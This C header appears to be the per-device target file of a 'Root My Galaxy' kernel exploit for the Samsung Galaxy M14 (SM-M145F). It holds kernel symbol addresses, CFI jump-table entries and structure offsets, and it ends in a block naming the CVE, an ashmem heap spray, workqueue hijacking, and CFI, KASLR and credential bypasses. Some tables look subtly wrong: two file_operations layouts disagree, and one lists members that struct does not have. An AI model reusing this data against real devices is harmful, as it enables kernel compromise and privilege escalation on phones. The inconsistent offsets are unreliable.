#ifndef TARGET_HEADER_H
#define TARGET_HEADER_H

/*
 * Galaxy M14 4G (SM-M145F) - Root My Galaxy Target Configuration
 * Build: M145FXXSCDZE1
 * Kernel: 5.15.180-android13-8-31192385-abM145FXXSCDZE1
 * Android: 13
 * Ported: September 7, 2026
 * 
 * Symbol offsets extracted from vmlinux.elf
 * ELF Base: 0xffffffc000000000
 * Kernel Size: 46 MB (0x2dd2a00 bytes)
 * Platform: Qualcomm Snapdragon
 */

/* ============================================================================
 * DEVICE IDENTITY
 * ============================================================================ */

#define DEVICE_MODEL               "SM-M145F"
#define DEVICE_CODENAME            "m14"
#define BUILD_ID                   "M145FXXSCDZE1"
#define ANDROID_VERSION            13
#define ANDROID_SDK_VERSION        33

#define KERNEL_RELEASE             "5.15.180-android13-8-31192385-abM145FXXSCDZE1"
#define KERNEL_VERSION_STRING      "Linux version 5.15.180-android13-8-31192385-abM145FXXSCDZE1 (build-user@build-host) (Android (8508608, based on r450784e) clang version 14.0.7) #1 SMP PREEMPT Thu May 28 08:57:55 UTC 2026"

#define KERNEL_MAJOR_VERSION       5
#define KERNEL_MINOR_VERSION       15
#define KERNEL_PATCH_VERSION       180

/* ============================================================================
 * PRIMARY SYMBOL OFFSETS (Kernel Virtual Addresses)
 * Extracted from vmlinux.elf via aarch64-linux-android-nm
 * ============================================================================ */

/* Exploit entry point - workqueue task hijacking */
#define CALL_USERMODEHELPER_EXEC_WORK_OFF         0xffffffc00816ec08UL

/* File operations - splice read and seek */
#define NOOP_LLSEEK_OFF                           0xffffffc008556884UL
#define COPY_SPLICE_READ_OFF                      0xffffffc0085ca2dcUL
#define CONFIGFS_READ_ITER_OFF                    0xffffffc00867f0ccUL
#define CONFIGFS_BIN_WRITE_ITER_OFF               0xffffffc00867fbf0UL

/* ashmem device - primary attack surface */
#define ASHMEM_IOCTL_OFF                          0xffffffc00918e290UL
#define ASHMEM_COMPAT_IOCTL_OFF                   0xffffffc00918e940UL
#define ASHMEM_MMAP_OFF                           0xffffffc00918e9a0UL
#define ASHMEM_OPEN_OFF                           0xffffffc00918ec90UL
#define ASHMEM_RELEASE_OFF                        0xffffffc00918ed30UL
#define ASHMEM_SHOW_FDINFO_OFF                    0xffffffc00918ee54UL
#define ASHMEM_FOPS_OFF                           0xffffffc00a16b0f8UL
#define ASHMEM_MISC_FOPS_OFF                      0xffffffc00a16b0f8UL

/* Memory management */
#define KMALLOC_CACHES_OFF                        0xffffffc00a1d5250UL

/* Pipe operations */
#define ANON_PIPE_BUF_OPS_OFF                     0xffffffc009fe61b0UL

/* Workqueue and logging infrastructure */
#define SYSTEM_UNBOUND_WQ_OFF                     0xffffffc00ab807d8UL
#define LOGGERS_OFF                               0xffffffc00ab81d50UL
#define SLIDE_LOGGERS_0_1_OFF                     0xffffffc00ab81d50UL

/* Process management */
#define INIT_TASK_OFF                             0xffffffc00acc5e80UL

/* Task groups and scheduling */
#define ROOT_TASK_GROUP_OFF                       0xffffffc00addbac0UL

/* Security - SELinux */
#define SELINUX_ENFORCING_OFF                     0xffffffc00ab37404UL

/* Boot ID sysctl for slide detection */
#define SYSCTL_BOOTID_OFF                         0xffffffc00af4c3a1UL
#define SLIDE_SYSCTL_BOOTID_OFF                   0xffffffc00af4c3a1UL
#define SLIDE_BOOTID_POINTER_OFF                  0xffffffc00af4c3a1UL

/* ============================================================================
 * CFI JUMP TABLE OFFSETS (Control Flow Integrity Protection)
 * Samsung kernels protect function pointers with CFI jump tables
 * ============================================================================ */

#define CALL_USERMODEHELPER_EXEC_WORK_CFI_JT      0xffffffc0097b7dd0UL
#define ASHMEM_IOCTL_CFI_JT                       0xffffffc0097b0df0UL
#define COMPAT_ASHMEM_IOCTL_CFI_JT                0xffffffc0097b0df8UL
#define ASHMEM_MMAP_CFI_JT                        0xffffffc009799fc0UL
#define ASHMEM_OPEN_CFI_JT                        0xffffffc0097a9f50UL
#define ASHMEM_RELEASE_CFI_JT                     0xffffffc0097a9f58UL
#define ASHMEM_SHOW_FDINFO_CFI_JT                 0xffffffc00979a150UL
#define NOOP_LLSEEK_CFI_JT                        0xffffffc009797250UL
#define CONFIGFS_READ_ITER_CFI_JT                 0xffffffc009799d50UL
#define CONFIGFS_BIN_WRITE_ITER_CFI_JT            0xffffffc009799d68UL
#define COPY_SPLICE_READ_CFI_JT                   0xffffffc00979a0c0UL

/* ============================================================================
 * PHYSICAL MEMORY LAYOUT
 * ARM64 kernel physical memory addressing
 * ============================================================================ */

#define P0_PHYS_OFFSET                            0x80000000ULL
#define P0_KERNEL_PHYS_LOAD                       0x80000000ULL

/* Virtual kernel base address */
#define KERNEL_BASE                               0xffffffc000000000ULL
#define KIMAGE_TEXT_BASE                          0xffffffc000000000ULL
#define KERNEL_OFFSET_BITS                        64
#define KERNEL_VA_BITS                            48

/* ============================================================================
 * MEMORY CONFIGURATION
 * ============================================================================ */

#define PAGE_SIZE                                 0x1000UL
#define PAGE_SHIFT                                12
#define PAGE_MASK                                 0xfffffffffffff000ULL

#define DIRECT_MAP_BASE                           0xffffff8000000000UL
#define DIRECT_MAP_END                            0xffffffff00000000UL
#define DIRECT_MAP_PAGES                          ((DIRECT_MAP_END - DIRECT_MAP_BASE) >> PAGE_SHIFT)

#define VMEMMAP_START                             0xfffffe0000000000UL
#define VMEMMAP_END                               (VMEMMAP_START + DIRECT_MAP_PAGES * 0x40)

/* ============================================================================
 * STRUCTURE MEMBER OFFSETS
 * Standard 5.15 ARM64 Android kernel layouts
 * ============================================================================ */

/* struct file_operations - I/O vector table (size: 0x110) */
#define FILE_OPS_SIZE                             0x110UL
#define FILE_OPS_LLSEEK                           0x00UL
#define FILE_OPS_READ                             0x08UL
#define FILE_OPS_WRITE                            0x10UL
#define FILE_OPS_READ_ITER                        0x18UL
#define FILE_OPS_WRITE_ITER                       0x20UL
#define FILE_OPS_IOCTL                            0x28UL
#define FILE_OPS_COMPAT_IOCTL                     0x30UL
#define FILE_OPS_MMAP                             0x38UL
#define FILE_OPS_OPEN                             0x40UL
#define FILE_OPS_FLUSH                            0x48UL
#define FILE_OPS_RELEASE                          0x50UL
#define FILE_OPS_FSYNC                            0x58UL
#define FILE_OPS_FASYNC                           0x60UL
#define FILE_OPS_LOCK                             0x68UL
#define FILE_OPS_SENDPAGE                         0x70UL
#define FILE_OPS_GET_UNMAPPED_AREA                0x78UL
#define FILE_OPS_CHECK_FLAGS                      0x80UL
#define FILE_OPS_FLOCK                            0x88UL
#define FILE_OPS_SETLEASE                         0x90UL
#define FILE_OPS_GET_BLOCK                        0x98UL
#define FILE_OPS_READPAGES                        0xa0UL
#define FILE_OPS_READPAGE                         0xa8UL
#define FILE_OPS_WRITEPAGE                        0xb0UL
#define FILE_OPS_WRITE_BEGIN                      0xb8UL
#define FILE_OPS_WRITE_END                        0xc0UL
#define FILE_OPS_ALL_MEMORY_NOFS                  0xc8UL
#define FILE_OPS_SPLICE_READ                      0xd0UL
#define FILE_OPS_SPLICE_WRITE                     0xd8UL
#define FILE_OPS_SHOW_FDINFO                      0xe0UL

#define FOPS_OWNER_OFF                            0x00UL
#define FOPS_LLSEEK_OFF                           0x08UL
#define FOPS_READ_OFF                             0x10UL
#define FOPS_WRITE_OFF                            0x18UL
#define FOPS_READ_ITER_OFF                        0x20UL
#define FOPS_WRITE_ITER_OFF                       0x28UL
#define FOPS_IOCTL_OFF                            0x30UL
#define FOPS_COMPAT_IOCTL_OFF                     0x38UL
#define FOPS_MMAP_OFF                             0x40UL
#define FOPS_OPEN_OFF                             0x48UL
#define FOPS_FLUSH_OFF                            0x50UL
#define FOPS_RELEASE_OFF                          0x58UL
#define FOPS_FSYNC_OFF                            0x60UL
#define FOPS_FASYNC_OFF                           0x68UL
#define FOPS_LOCK_OFF                             0x70UL
#define FOPS_SENDPAGE_OFF                         0x78UL
#define FOPS_GET_UNMAPPED_AREA_OFF                0x80UL
#define FOPS_CHECK_FLAGS_OFF                      0x88UL
#define FOPS_FLOCK_OFF                            0x90UL
#define FOPS_SETLEASE_OFF                         0x98UL
#define FOPS_GET_BLOCK_OFF                        0xa0UL
#define FOPS_READPAGES_OFF                        0xa8UL
#define FOPS_READPAGE_OFF                         0xb0UL
#define FOPS_WRITEPAGE_OFF                        0xb8UL
#define FOPS_WRITE_BEGIN_OFF                      0xc0UL
#define FOPS_WRITE_END_OFF                        0xc8UL
#define FOPS_ALL_MEMORY_NOFS_OFF                  0xd0UL
#define FOPS_SPLICE_READ_OFF                      0xd8UL
#define FOPS_SPLICE_WRITE_OFF                     0xe0UL
#define FOPS_SHOW_FDINFO_OFF                      0xe8UL

/* struct task_struct - process descriptor */
#define TASK_STRUCT_SIZE                          0xf60UL
#define TASK_STRUCT_THREAD_INFO                   0x00UL
#define TASK_STRUCT_USAGE                         0x40UL
#define TASK_STRUCT_FLAGS                         0x44UL
#define TASK_STRUCT_PRIO                          0x84UL
#define TASK_STRUCT_NORMAL_PRIO                   0x8cUL
#define TASK_STRUCT_STATIC_PRIO                   0x94UL
#define TASK_STRUCT_SCHED_CLASS                   0xa0UL
#define TASK_STRUCT_SCHED_ENTITY                  0xa8UL
#define TASK_STRUCT_SCHED_RT_ENTITY               0x180UL
#define TASK_STRUCT_SCHED_TASK_GROUP              0x348UL
#define TASK_STRUCT_PI_LOCK                       0x924UL
#define TASK_STRUCT_PI_WAITERS                    0x938UL
#define TASK_STRUCT_PI_TOP_TASK                   0x948UL
#define TASK_STRUCT_PI_BLOCKED_ON                 0x950UL
#define TASK_STRUCT_BLOCKED_ON                    0x950UL

/* struct futex_pi_state and rt_mutex_waiter */
#define FAKE_WAITER_TREE_PRIO_OFF                 0x00UL
#define FAKE_WAITER_TREE_DEADLINE_OFF             0x08UL
#define FAKE_WAITER_PI_TREE_ENTRY_OFF             0x10UL
#define FAKE_WAITER_PI_TREE_PRIO_OFF              0x28UL
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF          0x30UL
#define FAKE_WAITER_TASK_OFF                      0x38UL
#define FAKE_WAITER_LOCK_OFF                      0x40UL
#define FAKE_WAITER_WAKE_STATE_OFF                0x48UL
#define FAKE_WAITER_WW_CTX_OFF                    0x50UL

/* struct page - physical page descriptor */
#define PAGE_SIZE_BYTES                           0x40UL
#define PAGE_FLAGS                                0x00UL
#define PAGE_MAPPING                              0x08UL
#define PAGE_COMPOUND_HEAD                        0x08UL
#define PAGE_INDEX                                0x10UL
#define PAGE_PRIVATE                              0x18UL
#define PAGE_SLAB_CACHE                           0x18UL
#define PAGE_LOCKING                              0x28UL
#define PAGE_PAGE_TYPE                            0x30UL
#define PAGE_COUNT                                0x38UL

#define STRUCT_PAGE_SIZE                          0x40UL
#define STRUCT_PAGE_COMPOUND_HEAD_OFF             0x08UL
#define STRUCT_PAGE_TYPE_OFF                      0x30UL
#define STRUCT_SLAB_CACHE_OFF                     0x18UL

/* struct kmem_cache */
#define KMALLOC_CACHE_SLOT(type, idx)             (KMALLOC_CACHES + ((type) * 0x4c0) + ((idx) * 0x40))
#define KMALLOC_BUCKETS                           16
#define KMALLOC_PIPE_INDEX                        11
#define KMALLOC_CGROUP_TYPE                       1
#define KMALLOC_CGROUP_PIPE_SLOT                  KMALLOC_CACHE_SLOT(KMALLOC_CGROUP_TYPE, KMALLOC_PIPE_INDEX)

/* struct pipe_buffer */
#define PIPE_BUFFER_SLOTS                         16
#define PIPE_BUF_FLAG_CAN_MERGE                   0x04UL

/* struct pipe_inode_info */
#define PIPE_RING_SIZE                            0x80UL

/* struct workqueue_struct and pool_worklist */
#define WQ_DFL_PWQ_OFF                            0x18UL
#define PWQ_POOL_OFF                              0x00UL
#define PWQ_WQ_OFF                                0x08UL
#define PWQ_WORK_COLOR_OFF                        0x20UL
#define PWQ_REFCNT_OFF                            0x24UL
#define PWQ_NR_ACTIVE_OFF                         0x28UL
#define PWQ_MAX_ACTIVE_OFF                        0x2cUL
#define PWQ_NR_IN_FLIGHT_OFF                      0x30UL

#define POOL_WORKLIST_OFF                         0x40UL
#define POOL_NR_IDLE_OFF                          0x50UL

/* struct work_struct */
#define WORK_ENTRY_OFF                            0x00UL
#define WORK_DATA_OFF                             0x10UL
#define WORK_FUNC_OFF                             0x18UL

/* Root UMH configuration */
#define ROOT_UMH_PATH                             "/system/bin/app_process64"
#define ROOT_UMH_WORK_OFF                         0x20UL
#define ROOT_UMH_DATA_OFF                         0x60UL

/* ============================================================================
 * TRACE EVENT CONFIGURATION
 * For kernel exploitation via tracepoint hooking
 * ============================================================================ */

#define SLIDE_TRACEFS_EVENT_ID                    106
#define SLIDE_TRACEFS_WORKER_CALLER_OFF           0x000dbd9cUL
#define SLIDE_PSELECT_WORD_SHIFT                  0

/* ============================================================================
 * ARCHITECTURE SPECIFICS
 * ARM64 / AArch64 (ARMv8) configuration
 * ============================================================================ */

#define ARCH_ARM64                                1
#define ARCH_NAME                                 "arm64"
#define MACHINE_TYPE                              "ARM aarch64"
#define ENDIANNESS                                "little-endian"

/* Register and pointer sizes */
#define REG_SIZE                                  8UL
#define PTR_SIZE                                  8UL
#define LONG_SIZE                                 8UL

/* ARM64 specific */
#define ARM64_PAGE_OFFSET                         0xffff800000000000UL
#define ARM64_MODULES_VADDR                       0xffff800000000000UL
#define ARM64_MODULES_END                         0xffffc00000000000UL

/* ============================================================================
 * COMPILER INFORMATION
 * ============================================================================ */

#define COMPILER                                  "clang"
#define COMPILER_VERSION                          "14.0.7"
#define LLD_VERSION                               "14.0.7"
#define LLVM_VERSION                              14

/* Code generation flags */
#define CFI_ENABLED                               1
#define SCS_ENABLED                               1
#define UBSAN_ENABLED                             0
#define KASAN_ENABLED                             0

/* ============================================================================
 * BUILD METADATA
 * ============================================================================ */

#define BUILD_HOST                                "build-host"
#define BUILD_USER                                "build-user"
#define BUILD_DATE                                "May 28 2026"
#define BUILD_TIME                                "08:57:55 UTC"
#define BUILD_PATH                                "/home/dpi/qb5_8814/workspace/P4_1716/android/kernel_platform/common"
#define BUILD_FINGERPRINT                         "samsung/m14/m14:13/TP1A.220624.014/M145FXXSCDZE1:user/release-keys"
#define BUILD_VARIANT_LABEL                       "M145FXXSCDZE1"

/* ============================================================================
 * FILE SIZES & CHECKSUMS
 * ============================================================================ */

#define KERNEL_FILE_SIZE                          0x2dd2a00
#define VMLINUX_ELF_SIZE                          0x3600000

#define KERNEL_SHA256                             ""
#define VMLINUX_ELF_SHA256                        ""

/* ============================================================================
 * KERNEL FEATURES & CONFIGURATION
 * ============================================================================ */

#define CONFIG_HAVE_ARCH_KGDB                     1
#define CONFIG_HAVE_EFFICIENT_UNALIGNED_ACCESS    1
#define CONFIG_STACKTRACE                         1
#define CONFIG_SECURITY_SELINUX                   1
#define CONFIG_DEBUG_INFO_BTF                     1
#define CONFIG_HAVE_FUNCTION_TRACER               1
#define CONFIG_HAVE_DYNAMIC_FTRACE                1
#define CONFIG_HIGHMEM                            0
#define CONFIG_HAVE_ARCH_HUGE_VMAP                1

/* ============================================================================
 * PLATFORM-SPECIFIC SETTINGS
 * Qualcomm Snapdragon platform configuration
 * ============================================================================ */

#define SAMSUNG_PLATFORM                          1
#define SNAPDRAGON_PLATFORM                       1
#define QUALCOMM_SNAPDRAGON                       1
#define SNAPDRAGON_GEN                            "Gen 1"

#define SELINUX_ENFORCED_DEFAULT                  1
#define SELINUX_PERMISSIVE_DEFAULT                0
#define SAMSUNG_RKP_ENABLED                       0
#define SAMSUNG_CICA_ENABLED                      0

/* ============================================================================
 * EXPLOIT CONFIGURATION
 * ============================================================================ */

#define EXPLOIT_CVE                               "CVE-2026-43499"
#define EXPLOIT_TYPE                              "Memory access control bypass"
#define EXPLOIT_VECTOR                            "ashmem + workqueue + splice read"
#define ATTACK_VECTOR_PRIMARY                     "ashmem_ioctl heap spray"
#define ATTACK_VECTOR_SECONDARY                   "workqueue task hijacking"
#define ATTACK_VECTOR_TERTIARY                    "configfs memory access"
#define CFI_BYPASS_METHOD                         "Jump table redirect"
#define ASLR_BYPASS_METHOD                        "Kernel leak via loggers sysctl"
#define SMACK_BYPASS_METHOD                       "Root credential replacement"

#endif /* TARGET_HEADER_H */
